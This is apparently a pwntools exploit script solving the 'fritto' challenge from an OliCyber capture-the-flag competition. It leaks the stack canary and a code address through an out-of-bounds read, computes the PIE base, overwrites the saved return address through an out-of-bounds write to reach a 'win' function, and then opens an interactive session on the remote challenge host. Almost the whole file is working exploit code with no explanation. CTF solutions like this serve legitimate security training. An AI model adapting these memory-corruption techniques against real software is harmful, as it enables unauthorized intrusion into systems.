#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fritto '--host=fritto-disordinato.challs.olicyber.it' '--port=33001'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fritto')

context.update(terminal=["tmux", "split-window", "-h"])

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'fritto-disordinato.challs.olicyber.it'
port = int(args.PORT or 33001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

def from_int_to_address(a, b):
    return hex((b << 32) + a)

def getCanary():
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'leggere?', str(18).encode())
    io.recvline()
    a = int(io.recvline().split()[-1])
    if a < 0:
        a += 2**32
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'leggere?', str(18 + 1).encode())
    io.recvline()
    b = int(io.recvline().split()[-1])
    if b < 0: 
        b += 2**32
    return from_int_to_address(a, b)
    
def leakMain():
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'leggere?', str(22 + 16).encode())
    io.recvline()
    a = int(io.recvline().split()[-1])
    if a < 0:
        a += 2**32
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'leggere?', str(22 + 16 + 1).encode())
    io.recvline()
    b = int(io.recvline().split()[-1])
    if b < 0: 
        b += 2**32
    return from_int_to_address(a, b)

def writeNumber(n, index):
    io.sendlineafter(b'>', b'0')
    io.sendlineafter(b"numero?", str(index).encode())
    io.sendlineafter(b'scriverci?', str(n).encode())

def writeReturn(win):
    win0 = win & 0xFFFFFFFF
    win1 = win >> 32
    
    writeNumber(win0, 34)
    writeNumber(win1, 35)

io = start()

print(getCanary())      
main = leakMain()

base = int(main, 16) - exe.sym.main
win = exe.sym.win + base
print(hex(win))

writeReturn(win)
io.sendlineafter(b'> ', b'7')
io.interactive()

